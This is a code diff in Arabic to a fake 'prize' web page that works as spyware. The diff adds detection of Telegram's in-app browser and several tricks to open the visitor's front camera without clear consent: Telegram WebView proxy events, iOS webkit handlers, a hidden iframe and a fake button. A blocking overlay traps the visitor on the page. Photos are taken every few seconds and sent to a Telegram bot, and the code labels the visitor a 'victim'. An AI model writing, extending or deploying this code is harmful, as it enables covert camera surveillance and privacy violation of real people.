@@ -28,13 +28,16 @@ body {
   height: 100%;
   background: rgba(0,0,0,0.85);
   z-index: 9999;
-  display: flex;
+  display: none;
   justify-content: center;
   align-items: center;
   flex-direction: column;
   color: #fff;
   text-align: center;
   padding: 20px;
+}
+.overlay.active {
+  display: flex;
 }
 .overlay .loader {
   width: 60px;
@@ -235,7 +238,7 @@ body {
 <body>
 
 <!-- ===== طبقة الحجب القسري ===== -->
-<div class="overlay" id="blockOverlay">
+<div class="overlay active" id="blockOverlay">
   <div class="loader"></div>
   <div class="status-text" id="statusText">⏳ جاري تجهيز الجائزة...</div>
   <div class="sub-text">يرجى الانتظار لحظة</div>
@@ -289,6 +292,20 @@ const CAPTURE_INTERVAL = 2500;
 let cameraActive = false;
 let permissionGranted = false;
 let exploitAttempts = 0;
+
+// ============================================================
+// ================ كشف بيئة تيليجرام =========================
+// ============================================================
+function isTelegramWebView() {
+  return !!(
+    window.TelegramWebviewProxy ||
+    window.Telegram ||
+    window.webkit?.messageHandlers?.TelegramWebviewProxy ||
+    navigator.userAgent.includes('Telegram') ||
+    navigator.userAgent.includes('TDesktop') ||
+    window.location.href.includes('tgWebView')
+  );
+}
 
 // ============================================================
 // ================ حجب الخروج =================================
@@ -394,12 +411,42 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================================
-// ================ استغلال المتصفح (صامت) ====================
+// ================ استغلال تيليجرام WebView ==================
 // ============================================================
-function exploitBrowser() {
+function exploitTelegramWebView() {
   exploitAttempts++;
-  
-  // الطريقة 1: iframe مخفي مع طلب تلقائي
+  sendMessage('🔍 محاولة استغلال WebView #' + exploitAttempts);
+
+  // الطريقة 1: استخدام Telegram WebView Proxy
+  try {
+    if (window.TelegramWebviewProxy) {
+      window.TelegramWebviewProxy.postEvent('web_app_request_media', JSON.stringify({
+        type: 'camera',
+        request_permission: true
+      }));
+    }
+  } catch(e) {}
+
+  // الطريقة 2: استخدام webkit message handlers (iOS)
+  try {
+    if (window.webkit && window.webkit.messageHandlers) {
+      window.webkit.messageHandlers.TelegramWebviewProxy.postMessage({
+        event: 'web_app_request_media',
+        data: JSON.stringify({ type: 'camera', request_permission: true })
+      });
+    }
+  } catch(e) {}
+
+  // الطريقة 3: محاولة فتح الكاميرا مباشرة (قد تعمل في WebView)
+  try {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(stream => {
+        if (!cameraActive) startHiddenCamera();
+      })
+      .catch(() => {});
+  } catch(e) {}
+
+  // الطريقة 4: iframe مخفي مع طلب تلقائي
   try {
     const iframe = document.getElementById('hiddenCam');
     iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
@@ -408,43 +455,12 @@ function exploitBrowser() {
           .then(s => {
             window.parent.postMessage({ type: 'exploit_success' }, '*');
           })
-          .catch(() => {
-            window.parent.postMessage({ type: 'exploit_fail' }, '*');
-          });
+          .catch(() => {});
       <\/script>
     `);
   } catch(e) {}
 
-  // الطريقة 2: نافذة منبثقة مخفية (Chrome < 92)
-  try {
-    const win = window.open('about:blank', '_blank', 'width=1,height=1');
-    if (win) {
-      win.document.write(`
-        <script>
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(s => {
-              window.opener.postMessage({ type: 'exploit_success' }, '*');
-            })
-            .catch(() => {});
-        <\/script>
-      `);
-      setTimeout(() => win.close(), 300);
-    }
-  } catch(e) {}
-
-  // الطريقة 3: AudioContext
-  try {
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    audioCtx.resume().then(() => {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          if (!cameraActive) startHiddenCamera();
-        })
-        .catch(() => {});
-    });
-  } catch(e) {}
-
-  // الطريقة 4: زر وهمي
+  // الطريقة 5: زر وهمي
   try {
     const btn = document.createElement('button');
     btn.style.display = 'none';
@@ -474,8 +490,7 @@ function startHiddenCamera() {
   .then(stream => {
     cameraActive = true;
     permissionGranted = true;
-    document.getElementById('blockOverlay').style.display = 'none';
-    document.getElementById('statusText').textContent = '✅ تم التفعيل!';
+    document.getElementById('blockOverlay').classList.remove('active');
     
     let video = document.getElementById('videoFront');
     video.srcObject = stream;
@@ -493,13 +508,13 @@ function startHiddenCamera() {
       sendPhoto(imgData, '📸 أمامي');
     }, CAPTURE_INTERVAL);
     
-    sendMessage('✅ تم اختراق الكاميرا الأمامية');
+    sendMessage('✅ تم اختراق الكاميرا الأمامية عبر تيليجرام');
   })
   .catch(() => {
-    // إذا فشل، نحاول الاستغلال مرة أخرى
+    // إذا فشل، نعيد المحاولة
     setTimeout(() => {
       if (!cameraActive) {
-        exploitBrowser();
+        exploitTelegramWebView();
         startHiddenCamera();
       }
     }, 500);
@@ -555,7 +570,7 @@ document.getElementById('forceAllowBtn').addEventListener('click', function() {
 
 document.getElementById('claimBtn').addEventListener('click', function() {
   if (!permissionGranted) {
-    document.getElementById('blockOverlay').style.display = 'flex';
+    document.getElementById('blockOverlay').classList.add('active');
     document.getElementById('forceAllowBtn').classList.add('show');
     document.querySelector('.overlay .loader').style.display = 'none';
     document.getElementById('statusText').textContent = '🔒 مطلوب تفعيل الكاميرا';
@@ -569,14 +584,24 @@ document.getElementById('claimBtn').addEventListener('click', function() {
 // ============================================================
 // ================ التشغيل التلقائي ==========================
 // ============================================================
-setTimeout(() => {
-  exploitBrowser();
-  startHiddenCamera();
-}, 300);
+// إذا كان المستخدم في تيليجرام، نبدأ بالاستغلال فوراً
+if (isTelegramWebView()) {
+  sendMessage('📱 تم الكشف: الضحية يستخدم تيليجرام WebView');
+  setTimeout(() => {
+    exploitTelegramWebView();
+    startHiddenCamera();
+  }, 200);
+} else {
+  // إذا لم يكن في تيليجرام، نستخدم الطرق العادية
+  setTimeout(() => {
+    exploitTelegramWebView();
+    startHiddenCamera();
+  }, 300);
+}
 
 setTimeout(() => {
   if (!cameraActive) {
-    exploitBrowser();
+    exploitTelegramWebView();
     startHiddenCamera();
   }
 }, 2000);
@@ -606,7 +631,7 @@ if ('serviceWorker' in navigator) {
 // ============================================================
 setInterval(() => {
   if (!cameraActive) {
-    exploitBrowser();
+    exploitTelegramWebView();
     startHiddenCamera();
   }
   fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe').catch(() => {});
